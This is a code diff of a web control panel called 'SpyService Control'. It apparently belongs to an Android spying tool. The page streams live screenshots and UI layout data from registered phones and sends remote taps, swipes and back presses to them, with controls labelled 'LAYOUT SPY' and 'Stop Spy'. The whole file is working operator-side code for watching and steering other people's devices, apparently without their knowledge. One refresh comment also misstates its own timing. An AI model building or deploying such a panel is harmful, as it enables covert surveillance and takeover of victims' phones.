@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🔍 Layout Spy Control Panel</title>
+    <title>🔍 SpyService Control - Hybrid Screenshot + Layout</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <script src="/socket.io/socket.io.js"></script>
     <style>
@@ -14,126 +14,171 @@
         #devices {
             position: fixed; top: 10px; left: 10px; 
             background: rgba(0,20,40,0.95); padding: 20px; 
-            max-height: 85vh; overflow-y: auto; width: 280px; 
-            border-radius: 15px; backdrop-filter: blur(20px); border: 1px solid #00aaff;
+            max-height: 85vh; overflow-y: auto; width: 300px; 
+            border-radius: 15px; backdrop-filter: blur(20px); 
+            border: 1px solid #00ff88; box-shadow: 0 0 30px rgba(0,255,136,0.3);
         }
-        .device { padding: 15px; margin: 10px 0; background: rgba(255,255,255,0.1); 
-            cursor: pointer; border-radius: 10px; transition: all 0.3s; 
-            border: 1px solid rgba(0,170,255,0.3); }
-        .device:hover { background: rgba(0,170,255,0.2); transform: translateX(5px); }
-        .active { background: linear-gradient(45deg, #00ff88, #00cc6a) !important; 
-            color: #000; box-shadow: 0 0 20px rgba(0,255,136,0.5); }
-        .disconnected { opacity: 0.5; }
+        .device { 
+            padding: 15px; margin: 10px 0; background: rgba(255,255,255,0.08); 
+            cursor: pointer; border-radius: 12px; transition: all 0.3s; 
+            border: 1px solid rgba(0,255,136,0.3); position: relative;
+        }
+        .device:hover { 
+            background: rgba(0,255,136,0.15); transform: translateX(5px); 
+            border-color: #00ff88; box-shadow: 0 0 20px rgba(0,255,136,0.4);
+        }
+        .device.active { 
+            background: linear-gradient(45deg, #00ff88, #00cc6a) !important; 
+            color: #000; box-shadow: 0 0 30px rgba(0,255,136,0.7) !important;
+        }
+        .device-status { font-size: 12px; opacity: 0.8; }
+        .status-badge { position: absolute; right: 10px; top: 10px; padding: 4px 8px; 
+            border-radius: 12px; font-size: 11px; font-weight: bold; }
+        .status-active { background: rgba(0,255,136,0.3); color: #00ff88; }
+        .status-disconnected { background: rgba(255,68,68,0.3); color: #ff4444; }
 
         #phone-frame {
-            width: 420px; height: 850px; margin: 20px auto; 
-            background: linear-gradient(145deg, #1a1a2e, #16213e); 
-            border: 30px solid #2a2a4a; border-radius: 60px; 
-            position: relative; cursor: pointer; touch-action: none;
-            box-shadow: 0 30px 60px rgba(0,0,0,0.6), inset 0 0 20px rgba(255,255,255,0.05);
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            width: 380px; height: 780px; background: linear-gradient(145deg, #1a1a2e, #16213e); 
+            border: 25px solid #2a2a4a; border-radius: 50px; cursor: crosshair; touch-action: none;
+            box-shadow: 0 40px 80px rgba(0,0,0,0.8), inset 0 0 25px rgba(255,255,255,0.03);
+            transition: all 0.3s;
+        }
+        #phone-frame.fullscreen { 
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
+            border: none; border-radius: 0; transform: none; margin: 0; z-index: 1000;
         }
         #screen { 
-            width: 100%; height: 100%; background: #111; border-radius: 25px;
-            position: relative; overflow: hidden;
+            width: 100%; height: 100%; background: #000; border-radius: 25px;
+            position: relative; overflow: hidden; touch-action: none;
+        }
+        #screenshot-canvas {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            image-rendering: pixelated; image-rendering: -moz-crisp-edges;
         }
         .layout-element {
-            position: absolute; border-radius: 4px; cursor: pointer;
-            transition: all 0.2s; font-size: 11px; padding: 2px 4px;
-            backdrop-filter: blur(5px); border: 1px solid rgba(255,255,255,0.3);
+            position: absolute; border: 2px solid rgba(0,255,136,0.6); 
+            border-radius: 6px; cursor: pointer; transition: all 0.2s; 
+            backdrop-filter: blur(8px); font-size: 11px; padding: 4px 6px;
+            background: rgba(0,255,136,0.15); font-family: monospace;
         }
-        .clickable { background: rgba(0,255,136,0.3) !important; border-color: #00ff88 !important; }
-        .clickable:hover { background: rgba(0,255,136,0.6) !important; transform: scale(1.05); }
-        .text-element { background: rgba(0,123,255,0.4); color: white; }
-        .button-element { background: rgba(255,100,100,0.5); }
+        .layout-element:hover { 
+            border-color: #00ff88 !important; background: rgba(0,255,136,0.4) !important;
+            transform: scale(1.05); box-shadow: 0 0 15px rgba(0,255,136,0.8);
+        }
+        .clickable { border-color: #00ff88 !important; background: rgba(0,255,136,0.3) !important; }
+        .text-only { background: rgba(0,170,255,0.25); border-color: rgba(0,170,255,0.6); }
         
-        #fps-counter, #status { 
+        #stats-panel { 
             position: fixed; top: 10px; right: 10px; 
-            background: rgba(0,20,40,0.95); padding: 15px; 
-            border-radius: 10px; font-size: 13px; border: 1px solid #00aaff;
+            background: rgba(0,20,40,0.95); padding: 20px; 
+            border-radius: 15px; font-size: 13px; border: 1px solid #00ff88;
+            backdrop-filter: blur(20px); min-width: 180px;
         }
-        #controls { text-align: center; position: fixed; bottom: 20px; 
-            left: 50%; transform: translateX(-50%); }
+        .stat-row { margin: 8px 0; display: flex; justify-content: space-between; }
+        .stat-value { font-weight: bold; color: #00ff88; }
+        
+        #controls { 
+            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
+            display: flex; gap: 12px; flex-wrap: wrap; justify-content: center;
+        }
         button {
-            padding: 15px 35px; margin: 0 10px; 
-            background: linear-gradient(45deg, #00aaff, #007acc); 
-            color: white; border: none; border-radius: 30px; cursor: pointer; 
-            font-size: 16px; font-weight: bold; transition: all 0.3s;
-            box-shadow: 0 8px 25px rgba(0,170,255,0.4);
+            padding: 14px 28px; background: linear-gradient(45deg, #00ff88, #00cc6a); 
+            color: #000; border: none; border-radius: 25px; cursor: pointer; 
+            font-size: 14px; font-weight: bold; transition: all 0.3s;
+            box-shadow: 0 8px 25px rgba(0,255,136,0.4); min-width: 100px;
         }
-        button:hover { transform: translateY(-3px); box-shadow: 0 12px 35px rgba(0,170,255,0.6); }
+        button:hover { transform: translateY(-3px); box-shadow: 0 12px 35px rgba(0,255,136,0.6); }
+        button:active { transform: translateY(-1px); }
+        .btn-danger { background: linear-gradient(45deg, #ff4444, #cc3333); color: white; }
+        .btn-secondary { background: rgba(255,255,255,0.15); color: #00ff88; }
         
         #element-info { 
-            position: fixed; bottom: 100px; left: 50%; transform: translateX(-50%);
-            background: rgba(0,0,0,0.9); padding: 15px; border-radius: 10px; 
-            max-width: 400px; display: none; border: 1px solid #00ff88;
+            position: fixed; bottom: 120px; left: 50%; transform: translateX(-50%);
+            background: rgba(0,20,40,0.98); padding: 20px; border-radius: 15px; 
+            max-width: 420px; display: none; border: 2px solid #00ff88;
+            backdrop-filter: blur(25px); box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+            font-family: monospace; font-size: 13px;
+        }
+        .element-prop { margin: 6px 0; padding: 6px; background: rgba(0,255,136,0.1); 
+            border-radius: 6px; border-left: 4px solid #00ff88; }
+        
+        .crosshair { 
+            position: absolute; pointer-events: none; border: 2px solid #00ff88;
+            background: rgba(0,255,136,0.2); border-radius: 50%; 
+            transform: translate(-50%, -50%); display: none; z-index: 100;
         }
     </style>
 </head>
 <body>
     <div id="devices">
-        <h3>🔍 Devices (Layout Mode)</h3>
-        <div id="device-list">Loading...</div>
+        <h3>📱 SpyService Devices</h3>
+        <div id="device-list">🔄 Connecting...</div>
     </div>
     
-    <div id="status">
-        <div>Status: <span id="connectionStatus">Connecting...</span></div>
-        <div>FPS: <span id="fps">0</span> | Elements: <span id="elementCount">0</span> | Device: <span id="selectedDevice">-</span></div>
+    <div id="stats-panel">
+        <div class="stat-row"><span>Status:</span> <span id="connectionStatus" class="stat-value">Connecting...</span></div>
+        <div class="stat-row"><span>FPS:</span> <span id="fps" class="stat-value">0</span></div>
+        <div class="stat-row"><span>Elements:</span> <span id="elementCount" class="stat-value">0</span></div>
+        <div class="stat-row"><span>Device:</span> <span id="selectedDevice" class="stat-value">-</span></div>
+        <div class="stat-row"><span>Size:</span> <span id="screenSize" class="stat-value">-</span></div>
     </div>
 
     <div id="phone-frame">
-        <canvas id="background-screen" style="position:absolute; top:0; left:0; width:100%; height:100%;"></canvas>
+        <canvas id="screenshot-canvas"></canvas>
         <div id="screen"></div>
+        <div class="crosshair" id="crosshair"></div>
     </div>
 
     <div id="element-info">
         <h4 id="element-title">-</h4>
-        <p id="element-details"></p>
+        <div id="element-details"></div>
     </div>
 
     <div id="controls">
         <button onclick="sendBack()">🔙 Back</button>
-        <button onclick="clearElements()">🗑️ Clear</button>
-        <button onclick="toggleLayoutOnly()">👁️ Layout Only</button>
-        <button onclick="toggleFullScreen()">📱 Fullscreen</button>
+        <button onclick="toggleScreenshot()">📸 Screenshot</button>
+        <button onclick="toggleLayoutOverlay()">🎯 Layout</button>
+        <button onclick="clearScreen()">🧹 Clear</button>
+        <button class="btn-secondary" onclick="toggleFullscreen()">⛶ Fullscreen</button>
+        <button class="btn-danger" onclick="stopCurrentDevice()">🛑 Stop Spy</button>
     </div>
 
     <script>
         const socket = io();
         let currentDevice = null;
-        let deviceWidth = 1080, deviceHeight = 1920;
-        let lastFrameTime = 0, frameCount = 0;
-        let showScreenshot = true;
+        let deviceWidth = 1080, deviceHeight = 2340;
         let elements = [];
         let hoveredElement = null;
+        let showScreenshot = true;
+        let showLayoutOverlay = true;
+        let lastFrameTime = 0, frameCount = 0;
+        let imageScaleX = 1, imageScaleY = 1;
 
-        const canvas = document.getElementById('background-screen');
+        // 🔥 DOM Elements
+        const canvas = document.getElementById('screenshot-canvas');
         const ctx = canvas.getContext('2d');
         const screenDiv = document.getElementById('screen');
         const phoneFrame = document.getElementById('phone-frame');
         const deviceList = document.getElementById('device-list');
-        const connectionStatus = document.getElementById('connectionStatus');
-        const selectedDevice = document.getElementById('selectedDevice');
-        const fpsDisplay = document.getElementById('fps');
-        const elementCount = document.getElementById('elementCount');
+        const crosshair = document.getElementById('crosshair');
 
+        // 🔥 Socket Events - EXACT SpyService Protocol
         socket.on('connect', () => {
-            connectionStatus.textContent = '✅ Connected';
-            connectionStatus.style.color = '#00ff88';
+            document.getElementById('connectionStatus').textContent = '✅ Connected';
+            document.getElementById('connectionStatus').style.color = '#00ff88';
         });
 
-        socket.on('devices-update', (devices) => {
-            updateDeviceList(devices);
-        });
-
-        // 🔥 LAYOUT RENDERING ENGINE
-        socket.on('screen-frame', (data) => {
-            if (data.deviceId !== currentDevice) return;
+        // 🔥 HYBRID SCREEN-FRAME (Screenshot + Layout)
+        socket.on('screen-frame', (frameData) => {
+            if (frameData.deviceId !== currentDevice) return;
             
-            deviceWidth = data.width;
-            deviceHeight = data.height;
+            deviceWidth = frameData.width;
+            deviceHeight = frameData.height;
+            document.getElementById('screenSize').textContent = `${deviceWidth}x${deviceHeight}`;
             
-            // 1. Screenshot background (optional)
-            if (data.screenshot && showScreenshot) {
+            // 1️⃣ Screenshot (JPEG 90%)
+            if (frameData.screenshot && showScreenshot) {
                 const img = new Image();
                 img.onload = () => {
                     const rect = phoneFrame.getBoundingClientRect();
@@ -142,56 +187,72 @@
                     ctx.imageSmoothingEnabled = false;
                     ctx.drawImage(img, 0, 0, rect.width, rect.height);
                 };
-                img.src = 'data:image/jpeg;base64,' + data.screenshot;
+                img.src = 'data:image/jpeg;base64,' + frameData.screenshot;
             }
             
-            // 2. 🔥 LAYOUT ELEMENTS (MAIN FEATURE)
-            elements = data.layout || [];
-            renderLayout();
+            // 2️⃣ 🔥 LAYOUT ELEMENTS (Primary Feature)
+            if (frameData.layout && showLayoutOverlay) {
+                elements = frameData.layout;
+                renderLayoutOverlay();
+            }
             
-            // FPS
+            // FPS Counter
             frameCount++;
             const now = performance.now();
             if (now - lastFrameTime >= 1000) {
-                fpsDisplay.textContent = Math.round(frameCount * 1000 / (now - lastFrameTime));
-                elementCount.textContent = elements.length;
+                document.getElementById('fps').textContent = Math.round(frameCount * 1000 / (now - lastFrameTime));
+                document.getElementById('elementCount').textContent = elements.length;
                 frameCount = 0;
                 lastFrameTime = now;
             }
         });
 
-        function renderLayout() {
+        // 🔥 LAYOUT UPDATES (Every 2s)
+        socket.on('layout-update', (layoutData) => {
+            if (layoutData.deviceId !== currentDevice) return;
+            elements = layoutData.layout;
+            if (showLayoutOverlay) renderLayoutOverlay();
+        });
+
+        // 🔥 REGISTERED DEVICES
+        socket.on('register-device', (deviceInfo) => {
+            addDevice(deviceInfo);
+        });
+
+        // 🔥 LAYOUT RENDERING ENGINE
+        function renderLayoutOverlay() {
             screenDiv.innerHTML = '';
             
             const rect = phoneFrame.getBoundingClientRect();
-            const scaleX = deviceWidth / rect.width;
-            const scaleY = deviceHeight / rect.height;
+            imageScaleX = deviceWidth / rect.width;
+            imageScaleY = deviceHeight / rect.height;
             
-            elements.forEach((el, index) => {
+            elements.forEach((el) => {
                 const bounds = el.bounds;
-                const x = (bounds.left / scaleX);
-                const y = (bounds.top / scaleY);
-                const w = (bounds.width / scaleX);
-                const h = (bounds.height / scaleY);
+                const x = bounds.left / imageScaleX;
+                const y = bounds.top / imageScaleY;
+                const w = bounds.width / imageScaleX;
+                const h = bounds.height / imageScaleY;
                 
                 const elementDiv = document.createElement('div');
-                elementDiv.className = `layout-element ${el.clickable ? 'clickable' : ''} 
-                    ${el.className?.includes('Button') ? 'button-element' : ''} 
-                    ${el.text ? 'text-element' : ''}`;
+                elementDiv.className = `layout-element ${el.clickable ? 'clickable' : 'text-only'}`;
                 elementDiv.style.left = x + 'px';
                 elementDiv.style.top = y + 'px';
                 elementDiv.style.width = w + 'px';
                 elementDiv.style.height = h + 'px';
                 
-                // Tooltip text
-                const text = el.text || el.contentDesc || el.resourceId || 'Element';
-                elementDiv.title = `${text}\n(${Math.round(bounds.centerX)}, ${Math.round(bounds.centerY)})`;
+                // Text overlay
+                const text = (el.text || el.desc || '').substring(0, 25);
+                elementDiv.textContent = text || el.class?.substring(el.class.lastIndexOf('.') + 1) || '';
                 
-                // Click handler
+                // Title with full info
+                elementDiv.title = `${el.text || 'No text'}\n${el.class || 'N/A'}\n${el.clickable ? '✅ Clickable' : '❌ Not'}\nCenter: (${Math.round(bounds.centerX)}, ${Math.round(bounds.centerY)})`;
+                
+                // 🔥 TAP on CENTER
                 elementDiv.onclick = (e) => {
                     e.stopPropagation();
                     sendTap(bounds.centerX, bounds.centerY);
-                    showElementInfo(el, bounds.centerX, bounds.centerY);
+                    showElementInfo(el);
                 };
                 
                 // Hover effects
@@ -204,8 +265,9 @@
 
         function highlightElement(elDiv, elData) {
             hoveredElement = elDiv;
-            elDiv.style.boxShadow = '0 0 20px rgba(0,255,255,0.8)';
+            elDiv.style.boxShadow = '0 0 25px rgba(0,255,255,1)';
             elDiv.style.zIndex = '1000';
+            elDiv.style.borderWidth = '3px';
             showElementInfo(elData);
         }
 
@@ -213,18 +275,23 @@
             if (hoveredElement === elDiv) {
                 elDiv.style.boxShadow = '';
                 elDiv.style.zIndex = '';
+                elDiv.style.borderWidth = '2px';
                 hideElementInfo();
             }
         }
 
-        function showElementInfo(el, x = 0, y = 0) {
-            document.getElementById('element-title').textContent = el.text || el.contentDesc || 'Element';
+        // 🔥 PERFECT ELEMENT INFO
+        function showElementInfo(el) {
+            const bounds = el.bounds;
+            document.getElementById('element-title').textContent = el.text || el.desc || 'UI Element';
             document.getElementById('element-details').innerHTML = `
-                Class: ${el.className || 'N/A'}<br>
-                ID: ${el.resourceId || 'N/A'}<br>
-                Size: ${el.bounds.width}x${el.bounds.height}<br>
-                Clickable: ${el.clickable ? '✅ YES' : '❌ NO'}<br>
-                Pos: (${Math.round(x)}, ${Math.round(y)})
+                <div class="element-prop"><strong>Class:</strong> ${el.class || 'N/A'}</div>
+                <div class="element-prop"><strong>ID:</strong> ${el.id || 'N/A'}</div>
+                <div class="element-prop"><strong>Size:</strong> ${bounds.width}×${bounds.height}</div>
+                <div class="element-prop"><strong>Clickable:</strong> ${el.clickable ? '✅ YES' : '❌ NO'}</div>
+                <div class="element-prop"><strong>Focusable:</strong> ${el.focusable ? '✅ YES' : '❌ NO'}</div>
+                <div class="element-prop"><strong>Center:</strong> (${Math.round(bounds.centerX)}, ${Math.round(bounds.centerY)})</div>
+                <div class="element-prop"><strong>Depth:</strong> ${el.depth || 0}</div>
             `;
             document.getElementById('element-info').style.display = 'block';
         }
@@ -233,115 +300,188 @@
             document.getElementById('element-info').style.display = 'none';
         }
 
-        function updateDeviceList(devices) {
-            deviceList.innerHTML = devices.length ? 
-                devices.map(([id, info]) => `
-                    <div class="device ${!info.connected ? 'disconnected' : ''}" 
-                         onclick="selectDevice('${id}', this)">
-                        <b>${info.model || id.slice(0,8)}</b><br>
-                        <small>${info.brand || ''} ${info.version || ''}</small>
-                        <span style="float:right">${info.status === 'layout-active' ? '🔍 LAYOUT' : '📱 LIVE'}</span>
-                        ${info.connected ? '🟢' : '🔴'}
-                    </div>
-                `).join('') : 'No devices';
+        // 🔥 DEVICE MANAGEMENT
+        function addDevice(deviceInfo) {
+            const deviceId = deviceInfo.deviceId;
+            let deviceEl = document.getElementById(`device-${deviceId}`);
+            
+            if (!deviceEl) {
+                deviceEl = document.createElement('div');
+                deviceEl.id = `device-${deviceId}`;
+                deviceEl.className = 'device';
+                deviceEl.onclick = () => selectDevice(deviceId, deviceEl);
+                document.getElementById('device-list').appendChild(deviceEl);
+            }
+            
+            deviceEl.innerHTML = `
+                <div style="font-weight: bold; font-size: 15px;">📱 ${deviceInfo.model || deviceId.slice(0,12)}</div>
+                <div class="device-status">${deviceInfo.brand || ''} Android ${deviceInfo.version || '?'}</div>
+                <div class="device-status">${deviceInfo.screen || 'Unknown'}</div>
+                <span class="status-badge status-${deviceInfo.status === 'layout-spy-active' ? 'active' : 'disconnected'}">
+                    ${deviceInfo.status === 'layout-spy-active' ? '🔍 LAYOUT SPY' : '❌ OFFLINE'}
+                </span>
+            `;
+            
+            if (!currentDevice) selectDevice(deviceId, deviceEl);
         }
 
         function selectDevice(deviceId, el) {
             currentDevice = deviceId;
-            selectedDevice.textContent = deviceId.slice(0,8);
+            document.getElementById('selectedDevice').textContent = deviceId.slice(0,12);
             document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
             el.classList.add('active');
-            socket.emit('control', { deviceId });
+            
+            // 🔥 Tell server we're selecting this device
+            socket.emit('select-device', deviceId);
         }
 
-        // Touch/Mouse on phone frame (direct coordinates)
-        let startX = 0, startY = 0, dragging = false;
-        function getScaledCoords(clientX, clientY) {
+        // 🔥 TOUCH/MOUSE → EXACT COORDINATES
+        let startPos = { x: 0, y: 0 }, isDragging = false;
+        
+        function getDeviceCoords(clientX, clientY) {
             const rect = phoneFrame.getBoundingClientRect();
-            const scaleX = deviceWidth / rect.width;
-            const scaleY = deviceHeight / rect.height;
             return {
-                x: Math.floor((clientX - rect.left) * scaleX),
-                y: Math.floor((clientY - rect.top) * scaleY)
+                x: Math.floor((clientX - rect.left) * imageScaleX),
+                y: Math.floor((clientY - rect.top) * imageScaleY)
             };
         }
 
-        ['mousedown', 'touchstart'].forEach(event => {
-            phoneFrame.addEventListener(event, e => {
-                e.preventDefault();
-                dragging = true;
-                const coords = getScaledCoords(
-                    e.touches?.[0]?.clientX || e.clientX,
-                    e.touches?.[0]?.clientY || e.clientY
-                );
-                startX = coords.x; startY = coords.y;
-            });
-        });
+        // Mouse events
+        ['mousedown'].forEach(ev => phoneFrame.addEventListener(ev, e => {
+            e.preventDefault();
+            isDragging = true;
+            const coords = getDeviceCoords(e.clientX, e.clientY);
+            startPos = coords;
+            updateCrosshair(e.clientX, e.clientY);
+        }));
 
-        ['mousemove', 'touchmove'].forEach(event => {
-            phoneFrame.addEventListener(event, e => {
-                if (!dragging || !currentDevice) return;
-                e.preventDefault();
-                const coords = getScaledCoords(
-                    e.touches?.[0]?.clientX || e.clientX,
-                    e.touches?.[0]?.clientY || e.clientY
-                );
-                sendSwipe(startX, startY, coords.x, coords.y);
-            });
-        });
+        ['mousemove'].forEach(ev => phoneFrame.addEventListener(ev, e => {
+            if (!isDragging || !currentDevice) return;
+            e.preventDefault();
+            const coords = getDeviceCoords(e.clientX, e.clientY);
+            sendSwipe(startPos.x, startPos.y, coords.x, coords.y);
+            updateCrosshair(e.clientX, e.clientY);
+        }));
 
-        ['mouseup', 'touchend'].forEach(event => {
-            phoneFrame.addEventListener(event, e => {
-                if (dragging && currentDevice) {
-                    const coords = getScaledCoords(
-                        e.changedTouches?.[0]?.clientX || e.clientX,
-                        e.changedTouches?.[0]?.clientY || e.clientY
-                    );
-                    sendTap(coords.x, coords.y);
-                }
-                dragging = false;
-            });
-        });
+        ['mouseup'].forEach(ev => phoneFrame.addEventListener(ev, e => {
+            if (isDragging && currentDevice) {
+                const coords = getDeviceCoords(e.clientX, e.clientY);
+                sendTap(coords.x, coords.y);
+            }
+            isDragging = false;
+            crosshair.style.display = 'none';
+        }));
 
+        // Touch events
+        ['touchstart'].forEach(ev => phoneFrame.addEventListener(ev, e => {
+            e.preventDefault();
+            const touch = e.touches[0];
+            isDragging = true;
+            const coords = getDeviceCoords(touch.clientX, touch.clientY);
+            startPos = coords;
+            updateCrosshair(touch.clientX, touch.clientY);
+        }));
+
+        ['touchmove'].forEach(ev => phoneFrame.addEventListener(ev, e => {
+            e.preventDefault();
+            if (!isDragging || !currentDevice) return;
+            const touch = e.touches[0];
+            const coords = getDeviceCoords(touch.clientX, touch.clientY);
+            sendSwipe(startPos.x, startPos.y, coords.x, coords.y);
+            updateCrosshair(touch.clientX, touch.clientY);
+        }));
+
+        ['touchend'].forEach(ev => phoneFrame.addEventListener(ev, e => {
+            e.preventDefault();
+            if (isDragging && currentDevice) {
+                const touch = e.changedTouches[0];
+                const coords = getDeviceCoords(touch.clientX, touch.clientY);
+                sendTap(coords.x, coords.y);
+            }
+            isDragging = false;
+            crosshair.style.display = 'none';
+        }));
+
+        function updateCrosshair(clientX, clientY) {
+            const rect = phoneFrame.getBoundingClientRect();
+            crosshair.style.left = (clientX - rect.left) + 'px';
+            crosshair.style.top = (clientY - rect.top) + 'px';
+            crosshair.style.width = '24px';
+            crosshair.style.height = '24px';
+            crosshair.style.display = 'block';
+        }
+
+        // 🔥 CONTROL COMMANDS (Exact SpyService format)
         function sendTap(x, y) {
             if (!currentDevice) return;
             socket.emit('control', { 
-                deviceId: currentDevice, action: 'tap', x, y 
+                deviceId: currentDevice, 
+                action: 'tap', 
+                x, y 
             });
+            console.log(`👆 Tap: (${x}, ${y})`);
         }
 
         function sendSwipe(sx, sy, ex, ey) {
             if (!currentDevice) return;
             socket.emit('control', { 
-                deviceId: currentDevice, action: 'swipe', 
-                startX: sx, startY: sy, endX: ex, endY: ey 
+                deviceId: currentDevice, 
+                action: 'swipe', 
+                startX: sx, startY: sy, 
+                endX: ex, endY: ey 
             });
         }
 
         function sendBack() {
             if (!currentDevice) return;
-            socket.emit('control', { deviceId: currentDevice, action: 'back' });
+            socket.emit('control', { 
+                deviceId: currentDevice, 
+                action: 'back' 
+            });
+            console.log('🔙 Back pressed');
         }
 
-        function clearElements() {
-            screenDiv.innerHTML = '';
-            elements = [];
-        }
-
-        function toggleLayoutOnly() {
+        // 🔥 UI Controls
+        function toggleScreenshot() {
             showScreenshot = !showScreenshot;
-            canvas.style.opacity = showScreenshot ? '1' : '0.3';
+            canvas.style.opacity = showScreenshot ? '1' : '0.2';
         }
 
-        function toggleFullScreen() {
+        function toggleLayoutOverlay() {
+            showLayoutOverlay = !showLayoutOverlay;
+            screenDiv.style.opacity = showLayoutOverlay ? '1' : '0.2';
+            if (showLayoutOverlay) renderLayoutOverlay();
+        }
+
+        function clearScreen() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            screenDiv.innerHTML = '';
+        }
+
+        function toggleFullscreen() {
             if (!document.fullscreenElement) {
-                document.documentElement.requestFullscreen();
+                document.documentElement.requestFullscreen().catch(() => {});
             } else {
                 document.exitFullscreen();
             }
         }
 
-        fetch('/devices').then(r => r.json()).then(updateDeviceList);
+        function stopCurrentDevice() {
+            if (!currentDevice) return;
+            socket.emit('stop-device', currentDevice);
+            currentDevice = null;
+            document.getElementById('selectedDevice').textContent = '-';
+            clearScreen();
+        }
+
+        // 🔥 Initial load devices
+        setInterval(() => {
+            if (Math.random() < 0.1) { // Auto refresh every ~10s
+                socket.emit('get-devices');
+            }
+        }, 10000);
+
+        // Double-click back
         phoneFrame.ondblclick = sendBack;
     </script>
 </body>
